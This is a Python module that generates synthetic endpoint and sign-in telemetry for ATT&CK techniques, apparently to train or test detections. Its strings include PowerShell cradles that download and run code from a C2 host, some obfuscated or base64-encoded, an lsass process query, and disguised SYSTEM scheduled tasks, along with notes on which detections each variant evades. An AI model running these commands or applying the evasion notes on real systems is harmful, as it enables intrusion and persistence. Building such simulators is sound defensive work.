"""Execution and initial-access emitters."""
from __future__ import annotations

import base64
from datetime import timedelta
from typing import Iterator

from .. import rows
from .base import EmitContext, Variant, dwell, loud_scale, register


def _b64(text: str) -> str:
    """UTF-16LE base64, the form -EncodedCommand actually takes."""
    return base64.b64encode(text.encode("utf-16-le")).decode()


# ── T1047 WMI execution ──────────────────────────────────────────────────
#
# The execution reading of "WMI abuse" — running commands through WMI on the
# local host or against a remote one. Distinct from T1021.006 (lateral movement)
# and T1546.003 (persistence), which the resolver offers alongside it.

WMI_VARIANTS = [
    Variant("wmic_process_call", "wmic process call create",
            "wmic.exe with 'process call create', WmiPrvSE.exe as parent of the child",
            "", weight=1.0),
    Variant("powershell_cim", "PowerShell Invoke-CimMethod",
            "No wmic.exe at all - CIM cmdlets inside powershell.exe",
            "defeats detections keyed on wmic.exe", weight=1.0),
    Variant("wmi_recon", "WMI used for reconnaissance only",
            "wmic queries for AV product, OS, shares - no process creation",
            "defeats 'process call create' string matching", weight=0.9),
    Variant("wmiexec", "Impacket wmiexec",
            "WmiPrvSE spawning cmd.exe with output redirected to an ADMIN$ share",
            "", weight=0.8),
]


@register("T1047", WMI_VARIANTS,
          tables=("DeviceProcessEvents", "SecurityEvent", "DeviceNetworkEvents"))
def wmi_execution(ctx: EmitContext) -> Iterator[dict]:
    rng, plan, org = ctx.rng, ctx.plan, ctx.org
    intr = ctx.intrusion
    host = intr.current_host()
    user = intr.current_user()
    ts = plan.start

    if plan.variant == "wmi_recon":
        queries = [
            "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName",
            "wmic os get Caption,Version,OSArchitecture",
            "wmic share get name,path",
            "wmic process where name='lsass.exe' get processid",
            "wmic qfe get HotFixID,InstalledOn",
        ]
        for q in queries[:loud_scale(plan.loudness, 2, 5)]:
            ts += timedelta(seconds=rng.randint(3, 40))
            yield from ctx.mark(rows.execution(
                ctx.gen, host, user, ts, "wmic.exe", q,
                parent="cmd.exe"), "WMI reconnaissance")
        return

    payload = rf"{intr.staging_dir}\{intr.payload_name}"
    n = loud_scale(plan.loudness, 1, 4)
    for i in range(n):
        ts += dwell(rng, plan.loudness)
        if plan.variant == "wmic_process_call":
            cmd = f'wmic process call create "{payload}"'
            img = "wmic.exe"
        elif plan.variant == "powershell_cim":
            cmd = ("powershell.exe -NoProfile -Command Invoke-CimMethod "
                   "-ClassName Win32_Process -MethodName Create "
                   f"-Arguments @{{CommandLine='{payload}'}}")
            img = "powershell.exe"
        else:
            cmd = (r'cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__'
                   f'{rng.randint(1000000, 9999999)} 2>&1')
            img = "cmd.exe"

        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, img, cmd, parent="cmd.exe"), "WMI execution request")

        # The child always appears under WmiPrvSE — the durable tell.
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts + timedelta(seconds=2),
            intr.payload_name if plan.variant != "wmiexec" else "cmd.exe",
            payload if plan.variant != "wmiexec" else cmd,
            parent="WmiPrvSE.exe", integrity="High"), "child spawned by WmiPrvSE")


# ── T1059.001 PowerShell ─────────────────────────────────────────────────

PS_VARIANTS = [
    Variant("encoded", "-EncodedCommand download cradle",
            "Base64 UTF-16LE blob decoding to a DownloadString cradle",
            "collides with the benign developer who does this daily", weight=1.0),
    Variant("obfuscated", "String-concatenation obfuscation",
            "No -enc flag: the command is assembled from concatenated fragments",
            'defeats has "-enc" entirely', weight=1.0),
    Variant("fileless_iex", "IEX from a remote URL",
            "Short, readable command line with a plain http:// URL",
            "", weight=0.9),
    Variant("hidden_window", "Hidden window with bypass",
            "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile",
            "", weight=0.9),
]


@register("T1059.001", PS_VARIANTS,
          tables=("DeviceProcessEvents", "SecurityEvent", "DeviceNetworkEvents"))
def powershell_exec(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host = intr.current_host()
    user = intr.current_user()
    ts = plan.start
    url = f"http://{intr.c2_domain}/a"

    if plan.variant == "encoded":
        inner = f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
        cmd = f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {_b64(inner)}"
    elif plan.variant == "obfuscated":
        cmd = ("powershell.exe -NoP -C \"$a='New-Ob'+'ject Net.We'+'bClient';"
               f"IEX (&(GCM I*X) ((&($a)).('Down'+'loadString')('{url}')))\"")
    elif plan.variant == "fileless_iex":
        cmd = f"powershell.exe -c IEX(IWR {url} -UseBasicParsing)"
    else:
        cmd = (f"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile "
               f"-File {intr.staging_dir}\\s.ps1")

    yield from ctx.mark(rows.execution(
        ctx.gen, host, user, ts, "powershell.exe", cmd,
        parent=rng.choice(["cmd.exe", "WINWORD.EXE", "explorer.exe"])), "malicious PowerShell")

    yield from ctx.mark(rows.dns_event(
        ctx.gen, host, ts + timedelta(seconds=1), name=intr.c2_domain,
        answers=intr.c2_ip), "payload host lookup")
    yield from ctx.mark(rows.device_network_event(
        ctx.gen, host, user, ts + timedelta(seconds=2), remote_ip=intr.c2_ip,
        remote_port=80, remote_url=intr.c2_domain,
        process="powershell.exe"), "payload download")


# ── T1566.001 Spearphishing attachment ───────────────────────────────────

PHISH_VARIANTS = [
    Variant("macro_child", "Macro spawning a child process",
            "WINWORD.EXE or EXCEL.EXE as the parent of cmd/powershell",
            "", weight=1.0),
    Variant("lnk_dropper", "Archive containing a .lnk",
            "explorer.exe -> cmd.exe from a Downloads folder path",
            "defeats Office-parent detection", weight=0.9),
    Variant("html_smuggling", "HTML smuggling",
            "Browser writes an ISO/ZIP to Downloads, then a child from the mount",
            "no Office process involved at all", weight=0.8),
]


@register("T1566.001", PHISH_VARIANTS,
          tables=("DeviceProcessEvents", "SecurityEvent", "DeviceFileEvents",
                  "OfficeActivity"))
def spearphish_attachment(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.beachhead, intr.victim
    ts = plan.start

    if plan.variant == "macro_child":
        doc, parent = "Invoice_2026_Q3.docm", "WINWORD.EXE"
        yield from ctx.mark(rows.device_file_event(
            ctx.gen, host, user, ts, filename=doc,
            folder=rf"C:\Users\{user.sam}\Downloads\{doc}",
            action="FileCreated", process="OUTLOOK.EXE"), "attachment saved")
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts + timedelta(minutes=2), "cmd.exe",
            f"cmd.exe /c powershell -w hidden -c IWR http://{intr.c2_domain}/p -OutFile "
            rf"{intr.staging_dir}\{intr.payload_name}",
            parent=parent), "macro spawned a shell")

    elif plan.variant == "lnk_dropper":
        yield from ctx.mark(rows.device_file_event(
            ctx.gen, host, user, ts, filename="Statement.lnk",
            folder=rf"C:\Users\{user.sam}\Downloads\Statement.lnk",
            action="FileCreated", process="explorer.exe"), "lnk extracted from archive")
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts + timedelta(minutes=1), "cmd.exe",
            rf"cmd.exe /c start /min powershell -w hidden -enc {_b64('IEX(IWR http://x/a)')}",
            parent="explorer.exe"), "lnk executed")

    else:
        yield from ctx.mark(rows.device_file_event(
            ctx.gen, host, user, ts, filename="Report.iso",
            folder=rf"C:\Users\{user.sam}\Downloads\Report.iso",
            action="FileCreated", process="msedge.exe",
            FileOriginUrl=f"https://{intr.c2_domain}/dl/report",
            FileOriginIP=intr.c2_ip), "HTML smuggled archive")
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts + timedelta(minutes=3), intr.payload_name,
            rf"D:\{intr.payload_name}", parent="explorer.exe"), "payload run from mounted ISO")

    intr.reach(host)


# ── T1078.004 Valid cloud accounts ───────────────────────────────────────

CLOUD_ACCT_VARIANTS = [
    Variant("foreign_ip", "Sign-in from an unusual country",
            "Successful interactive sign-in from a country the user never uses",
            "collides with the genuinely travelling executive", weight=1.0),
    Variant("residential_proxy", "Sign-in via a residential proxy in-country",
            "Same country as the user, unfamiliar ASN, no geo anomaly at all",
            "defeats country-based detection completely", weight=0.9),
    Variant("token_replay", "Non-interactive token replay",
            "Only AADNonInteractiveUserSignInLogs - no interactive sign-in ever occurs",
            "invisible to anyone querying only SigninLogs", weight=0.9),
]


@register("T1078.004", CLOUD_ACCT_VARIANTS,
          tables=("SigninLogs", "AADNonInteractiveUserSignInLogs", "OfficeActivity"))
def cloud_account_abuse(ctx: EmitContext) -> Iterator[dict]:
    from ..benign.identity import _signin_row

    rng, plan, org = ctx.rng, ctx.plan, ctx.org
    intr = ctx.intrusion
    victim = intr.stolen_creds[-1] if intr.stolen_creds else intr.victim
    ts = plan.start
    n = loud_scale(plan.loudness, 3, 15)

    if plan.variant == "foreign_ip":
        city, cc, ip = "Lagos", "NG", intr.c2_ip
    elif plan.variant == "residential_proxy":
        city, cc = victim.location.city, victim.location.country_code
        ip = f"49.{rng.randint(180, 199)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"
    else:
        city, cc, ip = "Frankfurt", "DE", intr.c2_ip

    interactive = plan.variant != "token_replay"
    table = "SigninLogs" if interactive else "AADNonInteractiveUserSignInLogs"

    for i in range(n):
        ts += timedelta(minutes=rng.randint(2, 45))
        row = _signin_row(ctx.gen, table, ts, victim, interactive)
        row.update({
            "ResultType": "0",
            "ResultDescription": "",
            "IPAddress": ip,
            "Location": cc,
            "LocationDetails": {"city": city, "countryOrRegion": cc, "state": city},
            "AuthenticationRequirement": "singleFactorAuthentication",
            "ConditionalAccessStatus": "notApplied",
            "Status": {"errorCode": 0},
        })
        row["__table"] = table
        yield from ctx.mark(row, f"{plan.variant} sign-in {i + 1}")

    intr.steal(victim)


# ── T1053.005 Scheduled task ─────────────────────────────────────────────

SCHTASK_VARIANTS = [
    Variant("schtasks_create", "schtasks /create",
            "schtasks.exe with /create and a payload path in /tr",
            "", weight=1.0),
    Variant("powershell_task", "Register-ScheduledTask",
            "No schtasks.exe - the task is registered from PowerShell",
            "defeats schtasks.exe detection", weight=0.9),
    Variant("hijack_existing", "Hijack an existing task's binary",
            "Registry write under TaskCache, no task-creation event",
            "defeats task-creation detection entirely", weight=0.8),
]


@register("T1053.005", SCHTASK_VARIANTS,
          tables=("DeviceProcessEvents", "SecurityEvent", "DeviceRegistryEvents"))
def scheduled_task(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.start
    name = rng.choice(["MicrosoftEdgeUpdateTaskMachineUA", "OneDriveStandaloneUpdater",
                       "GoogleUpdateTaskMachineCore", "WindowsDefenderScan"])
    payload = rf"{intr.staging_dir}\{intr.payload_name}"

    if plan.variant == "schtasks_create":
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "schtasks.exe",
            f'schtasks.exe /create /tn "{name}" /tr "{payload}" /sc minute /mo 30 '
            f"/ru SYSTEM /f", parent="cmd.exe", integrity="High"), "task created")
    elif plan.variant == "powershell_task":
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "powershell.exe",
            f"powershell.exe -NoProfile -Command Register-ScheduledTask -TaskName '{name}' "
            f"-Action (New-ScheduledTaskAction -Execute '{payload}') "
            f"-Trigger (New-ScheduledTaskTrigger -AtLogon) -User SYSTEM -Force",
            parent="cmd.exe", integrity="High"), "task registered via PowerShell")
    else:
        yield from ctx.mark(rows.device_registry_event(
            ctx.gen, host, user, ts,
            key=rf"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
                rf"\Schedule\TaskCache\Tasks\{{{rng.randint(10000000, 99999999)}}}",
            value_name="Actions", value_data=payload,
            process="svchost.exe", integrity="System"), "existing task hijacked")
